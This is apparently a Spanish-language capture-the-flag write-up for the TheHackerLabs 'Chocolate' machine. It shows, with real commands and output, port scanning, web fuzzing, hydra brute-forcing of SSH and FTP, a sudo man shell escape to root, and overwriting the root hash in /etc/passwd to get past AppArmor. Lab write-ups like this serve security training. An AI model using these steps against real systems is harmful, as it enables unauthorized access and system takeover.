---
title: "Chocolate - TheHackerLabs"
date: 2025-05-08
draft: false
slug: "THL-writeup-chocolate"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos, nos damos cuenta de que no podremos entrar al servicio FTP activo y la página web activa en el puerto 80, solamente muestra la página por defecto de Apache2. Entonces, empezamos aplicando Fuzzing para ver qué podíamos encontrar, siendo que así encontramos un directorio que, al entrar, nos muestra un mensaje, mencionando a un usuario. Tomamos a ese usuario mencionado, para aplicar Fuerza Bruta al servicio SSH y FTP, logrando obtener su contraseña y ganando acceso a ambos servicios. Dentro, no encontramos alguna forma de escalar privilegios, pero sí encontramos otro usuario registrado al que igual le aplicamos Fuerza Bruta, siendo que obtuvimos su contraseña para el servicio SSH y FTP. Logueándonos como este nuevo usuario en SSH, descubrimos que tiene el privilegio de usar el binario man como Root. Utilizamos la guía de GTFOBIns para escalar privilegios usando este binario, con lo que aplicamos un Shell Escape y nos convertimos en Root. Lo curioso es que descubrimos que el binario man, está dentro de un perfil restrictivo de AppArmor, lo que nos impide hacer otras acciones. Optamos por suplantar la contraseña del Root con la herramienta openssl y nos quitamos esas restricciones."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "FTP", "SSH", "Web Enumeration", "Fuzzing", "Brute Force Attack", "Abusing Sudoers Privileges", "Privesc - Abusing Sudoers Privileges", "Shell Escape", "Privesc - Shell Escape", "Abusing /etc/passwd File", "AppArmor Confinement Escape", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "ffuf"
  - "gobuster"
  - "hydra"
  - "ssh"
  - "ftp"
  - "sudo"
  - "man"
  - "aa-status"
  - "openssl"
  - "su"
links:
  - "https://gtfobins.github.io/gtfobins/man/"
  - "https://stackoverflow.com/questions/35469038/how-to-find-out-what-linux-capabilities-a-process-requires-to-work"
  - "https://computernewage.com/2022/09/03/gnu-linux-apparmor-tutorial/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-chocolate/chocolate.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.40
PING 192.168.10.40 (192.168.10.40) 56(84) bytes of data.
64 bytes from 192.168.10.40: icmp_seq=1 ttl=64 time=1.36 ms
64 bytes from 192.168.10.40: icmp_seq=2 ttl=64 time=1.10 ms
64 bytes from 192.168.10.40: icmp_seq=3 ttl=64 time=1.39 ms
64 bytes from 192.168.10.40: icmp_seq=4 ttl=64 time=1.65 ms

--- 192.168.10.40 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3025ms
rtt min/avg/max/mdev = 1.103/1.372/1.645/0.191 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.40 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 12:10 CST
Initiating ARP Ping Scan at 12:10
Scanning 192.168.10.40 [1 port]
Completed ARP Ping Scan at 12:10, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:10
Scanning 192.168.10.40 [65535 ports]
Discovered open port 80/tcp on 192.168.10.40
Discovered open port 21/tcp on 192.168.10.40
Discovered open port 22/tcp on 192.168.10.40
Completed SYN Stealth Scan at 12:11, 71.86s elapsed (65535 total ports)
Nmap scan report for 192.168.10.40
Host is up, received arp-response (0.0026s latency).
Scanned at 2025-05-08 12:10:42 CST for 72s
Not shown: 44691 filtered tcp ports (no-response), 20841 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 72.17 seconds
           Raw packets sent: 116467 (5.125MB) | Rcvd: 20849 (834.056KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo 3 puertos abiertos, y es curioso ver el **puerto 21** activo en una máquina **Linux**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 21,22,80 192.168.10.40 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 12:12 CST
Nmap scan report for 192.168.10.40
Host is up (0.00089s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 5e:9f:68:a6:47:8a:7a:75:09:8e:8b:34:b1:e1:47:18 (ECDSA)
|_  256 49:d8:aa:23:a0:a9:1f:82:fd:89:c6:6d:18:d4:03:80 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))

|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Interesante, este escaneo no nos reportó nada más sobre el **servicio FTP**, por lo que no creo que sea posible entrar con el **usuario anonymous**.

También, el escaneo nos reporta que la página web está mostrando la página por defecto de **Apache2**, y si vamos a visitarla, no encontraremos nada ni en su código fuente.

Entonces, vamos a empezar aplicando **Fuzzing** para ver qué nos podemos encontrar.

## Análisis de Vulnerabilidades {#Analisis}

### Fuzzing {#fuzz}

Vamos a probar la herramienta **ffuf** en esta ocasión:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt:FUZZ -u http://192.168.10.40/FUZZ -recursion -recursion-depth 1 -e .php,.txt,.html -t 300

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.10.40/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.html              [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 36ms]
web                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 36ms]
[INFO] Adding a new job to the queue: http://192.168.10.40/web/FUZZ

.html                   [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 64ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 67ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 230ms]
[INFO] Starting queued job on target: http://192.168.10.40/web/FUZZ

index.html              [Status: 200, Size: 91, Words: 12, Lines: 2, Duration: 56ms]
.html                   [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 42ms]
                        [Status: 200, Size: 91, Words: 12, Lines: 2, Duration: 46ms]
:: Progress: [4740960/4740960] :: Job [2/2] :: 2471 req/sec :: Duration: [0:28:42] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-recursion* | Para indicar un escaneo recursivo, es decir, que escanee directorios encontrados. |
| *--recursion-depth* | Para indicar la profundidad del escaneo recursivo. |
| *-e*       | Para indicar extensiones de archivos a buscar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.10.40/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -t 200 -x php,html,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.40/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/web                  (Status: 301) [Size: 314] [--> http://192.168.10.40/web/]
/.html                (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 4740960 / 4740964 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*       | Para indicar extensiones de archivos a buscar. |

Solamente encontramos un directorio llamado `/web` y si lo visitamos, encontraremos un mensaje:

<p align="center">
<img src="/assets/images/THL-writeup-chocolate/Captura1.png">
</p>

Tenemos un usuario llamado **bob**, pero de ahí en fuera, no encontraremos más.

Intentemos aplicar Fuerza Bruta al **servicio SSH** utilizando este usuario.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta al Servicio SSH y FTP con el Usuario bob {#FuerzaBruta}

Primero, hagamos Fuerza Bruta al **servicio SSH** con la herramienta **hydra**:
```bash
hydra -l 'bob' -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.40 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-08 14:01:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.10.40:22/
[22][ssh] host: 192.168.10.40   login: bob   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 23 final worker threads did not complete until end.
[ERROR] 23 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-08 14:02:00
```
Muy bien, tenemos la contraseña.

Probémosla:
```bash
ssh bob@192.168.10.40
bob@192.168.10.40's password: 
Linux chocolate 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
...
Last login: Thu May  8 22:03:30 2025
bob@chocolate:~$
```
Listo, somos **bob**.

También podemos aplicar Fuerza Bruta al **servicio FTP**:
```bash
hydra -l 'bob' -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.40 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-08 14:02:10
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://192.168.10.40:21/
[21][ftp] host: 192.168.10.40   login: bob   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 14 final worker threads did not complete until end.
[ERROR] 14 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-08 14:02:16
```

Probemos la contraseña:
```bash
ftp 192.168.10.40
Connected to 192.168.10.40.
220 (vsFTPd 3.0.3)
Name (192.168.10.40:berserkwings): bob
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Encontramos algunos archivos, mismos que encontraremos dentro del **SSH**:
```bash
ftp> ls
229 Entering Extended Passive Mode (|||9891|)
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001          352 May 16  2024 limpieza.sh
-r--------    1 0        0              33 May 16  2024 user.txt
226 Directory send OK.
```
Pero no podremos descargar la flag, solo el script.

Esto es porque la flag de este usuario porque le pertenece al **usuario Root**:
```bash
bob@chocolate:~$ ls -la
total 32
drwx------ 2 bob  bob  4096 may  8 22:03 .
drwxr-xr-x 5 root root 4096 may 16  2024 ..
-rw------- 1 bob  bob     5 may  8 22:03 .bash_history
-rw-r--r-- 1 bob  bob   220 may 16  2024 .bash_logout
-rw-r--r-- 1 bob  bob  3526 may 16  2024 .bashrc
-rw-r--r-- 1 bob  bob   352 may 16  2024 limpieza.sh
-rw-r--r-- 1 bob  bob   807 may 16  2024 .profile
-r-------- 1 root root   33 may 16  2024 user.txt
```

## Post Explotación {#Post}

### Enumeración de Máquina Víctima {#linEnum}

Revisando los privilegios de nuestro usuario, no tendremos ninguno:
```bash
bob@chocolate:~$ sudo -l
[sudo] contraseña para bob: 
Sorry, user bob may not run sudo on chocolate.
```

Pero si encontramos un script que es el que menciona el mensaje de la página web:
```bash
bob@chocolate:~$ cat limpieza.sh 
#!/bin/bash

temp_directories=("/tmp" "/var/tmp" "/run/user/$UID")

file_patterns=("*.tmp" "*.temp" "*.bak" "*.swp")

echo "Eliminando archivos temporales..."

for dir in "${temp_directories[@]}"; do
    for pattern in "${file_patterns[@]}"; do
        find "$dir" -type f -name "$pattern" -delete
    done
done

echo "Archivos temporales eliminados."
```
Parece ser un script que limpia todos los archivos temporales de 3 directorios, no hace nada más.

Podríamos aprovecharnos de este script, pero le pertenece a nuestro usuario, por lo que no podremos hacer mucho.

Si revisamos el archivo `/etc/passwd`, encontraremos dos usuarios más:
```bash
bob@chocolate:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
bob:x:1001:1001:bob,,,:/home/bob:/bin/bash
mongodb:x:103:65534::/nonexistent:/usr/sbin/nologin
secretote:x:1002:1002:secretote,,,:/home/secretote:/bin/bas
```
Son **debian y secretote**.

Por consiguiente, revisando el directorio `/home`, estarán los directorios de todos los usuarios:
```bash
bob@chocolate:~$ ls -la /home
total 20
drwxr-xr-x  5 root      root      4096 may 16  2024 .
drwxr-xr-x 18 root      root      4096 may 16  2024 ..
drwx------  3 bob       bob       4096 may  8 22:07 bob
drwx------  2 debian    debian    4096 may 16  2024 debian
drwx------  2 secretote secretote 4096 may 16  2024 secretote
```
No podremos entrar a ninguno, a menos que nos autentiquemos como estos usuarios.

De ahí en fuera, no encontraremos algo más que nos sea útil.

Intentemos aplicar Fuerza Bruta al **usuario secretote**, ya que es el que más llama la atención.

### Aplicando Fuerza Bruta al Servicio SSH y FTP con el Usuario secretote {#FuerzaBruta2}

Primero, probemos contra el **servicio SSH**:
```bash
hydra -l 'secretote' -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.40 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-08 15:06:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://192.168.10.40:22/
[STATUS] 707.00 tries/min, 707 tries in 00:01h, 14343718 to do in 338:09h, 38 active
[22][ssh] host: 192.168.10.40   login: secretote   password: ******
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 32 final worker threads did not complete until end.
[ERROR] 32 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-08 15:08:47
```
Genial, tenemos la contraseña.

Probémosla:
```bash
ssh secretote@192.168.10.40
secretote@192.168.10.40's password: 
Linux chocolate 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64
...
secretote@chocolate:~$
```
Listo, estamos dentro.

También podemos aplicar contra el **servicio FTP**:
```bash
hydra -l 'secretote' -P /usr/share/wordlists/rockyou.txt ftp://192.168.10.40 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-08 14:26:19
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://192.168.10.40:21/
[STATUS] 817.00 tries/min, 817 tries in 00:01h, 14343596 to do in 292:37h, 50 active
[21][ftp] host: 192.168.10.40   login: secretote   password: ******
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 18 final worker threads did not complete until end.
[ERROR] 18 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-08 14:28:20
```
Igual, obtuvimos la contraseña.

Aunque no encontraremos nada dentro del directorio de este usuario.

### Escalando Privilegios con Binario Man (Shell Escape) y Suplantando Contraseña de Root con openssl {#man}

Si revisamos los privilegios de este usuario, encontraremos algo interesante:
```bash
secretote@chocolate:~$ sudo -l
[sudo] contraseña para secretote: 
Matching Defaults entries for secretote on chocolate:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User secretote may run the following commands on chocolate:
    (ALL : ALL) /usr/bin/man
```
Podemos usar el **binario man** como el **usuario Root**.

Si investigamos este binario en la **guía de GTFOBins**, encontraremos una forma de escalar privilegios:
* <a href="https://gtfobins.github.io/gtfobins/man/" target="_blank">GTFOBins: man</a>

Y aquí está:

<p align="center">
<img src="/assets/images/THL-writeup-chocolate/Captura2.png">
</p>

Prácticamente, esto es aplicar un **Shell Escape**.

Vamos a aplicarlo:
```bash
secretote@chocolate:~$ sudo man man
```

Ahora, escapamos del manual con `!/bin/bash`:

<p align="center">
<img src="/assets/images/THL-writeup-chocolate/Captura3.png">
</p>

Al dar Enter, ya escapamos del manual y mira lo que obtenemos:
```bash
root@chocolate:/home/secretote# 
root@chocolate:/home/secretote# whoami
root
```
Somos **Root**.

Podemos obtener la flag del **Root**:
```bash
root@chocolate:/home/secretote# cd /root
root@chocolate:~# cat root.txt
...
```
Tenemos la flag.

El problema será cuando intentemos leer la flag del usuario, ya que no nos permitirá ni entrar ni ver el contenido del **usuario bob** y tampoco de cualquier otro usuario:
```bash
root@chocolate:~# ls -la /home/bob
ls: no se puede abrir el directorio '/home/bob': Permiso denegado
root@chocolate:/home# cd bob
bash: cd: bob: Permiso denegado
```
Esto es raro, ya que normalmente deberíamos poder entrar o al menos listar el contenido de cualquier usuario.

Investigando un poco y apoyándome con **ChatGPT**, resulta que es un problema del **binario man**, ya que está dentro de un **perfil AppArmor restrictivo**.

¿Qué es **AppArmor**?

| **AppArmor** |
|:-----------:|
| *AppArmor (Abbreviado de Application Armor) es un sistema de control de acceso obligatorio (MAC - Mandatory Access Control) para Linux que restringe lo que pueden hacer los programas en el sistema, incluso si están siendo ejecutados por el usuario root. AppArmor aplica perfiles de seguridad a procesos individuales (como man, bash, apache2, etc.). Estos perfiles definen qué archivos, directorios, capacidades del sistema y recursos puede acceder cada programa.* |

Entonces, puede que el **binario man** tenga restricciones de uso, aunque seamos **Root**.

Esto lo podemos revisar con el comando **aa-status**:
```bash
root@chocolate:/home# aa-status
apparmor module is loaded.
10 profiles are loaded.
10 profiles are in enforce mode.
   /usr/bin/man
   /usr/lib/NetworkManager/nm-dhcp-client.action
   /usr/lib/NetworkManager/nm-dhcp-helper
   /usr/lib/connman/scripts/dhclient-script
   /{,usr/}sbin/dhclient
   lsb_release
   man_filter
   man_groff
   nvidia_modprobe
   nvidia_modprobe//kmod
0 profiles are in complain mode.
0 profiles are in kill mode.
0 profiles are in unconfined mode.
5 processes have profiles defined.
5 processes are in enforce mode.
   /usr/bin/man (2516) 
   /usr/bin/less (2526) /usr/bin/man
   /usr/bin/dash (2533) /usr/bin/man
   /usr/bin/bash (2534) /usr/bin/man
   /usr/sbin/aa-status (2655) /usr/bin/man
0 processes are in complain mode.
0 processes are unconfined but have a profile defined.
0 processes are in mixed mode.
0 processes are in kill mode.
```
Observa que ahí está el **binario man** dentro de un perfil restrictivo, es lo que impide que podamos ver los directorios de los usuarios.

Lo que podemos hacer es, cambiar la contraseña del **usuario Root**, suplantándola con una contraseña random usando **openssl**.

Vamos a crear una contraseña random:
```bash
root@chocolate:/home/secretote# openssl passwd hackeado
$1$FhisMkp/$B6KN6GoH3azRt0BmueZMk.
```

Ahora, abre el `/etc/passwd`, elimina la X y pega todo el output del **openssl**:
```bash
root@chocolate:/home/secretote# cat /etc/passwd
root:$1$FhisMkp/$B6KN6GoH3azRt0BmueZMk.:0:0:root:/root:/bin/bash
```
Quedaría así.

Ya solo vuelve a convertirte en el **usuario secretote o bob** o incluso desde otra sesión para entrar al **SSH** y autentícate como **Root**:
```bash
secretote@chocolate:~$ su root
Contraseña: 
root@chocolate:/home/secretote# whoami
root
```
Listo, volvemos a ser **Root**.

Ahora sí, podemos ver la flag del usuario que nos falta:
```bash
root@chocolate:/home/secretote# ls /home/bob
limpieza.sh  user.txt
root@chocolate:/home/secretote# cat /home/bob/user.txt
...
```
Y con esto, terminamos la máquina.
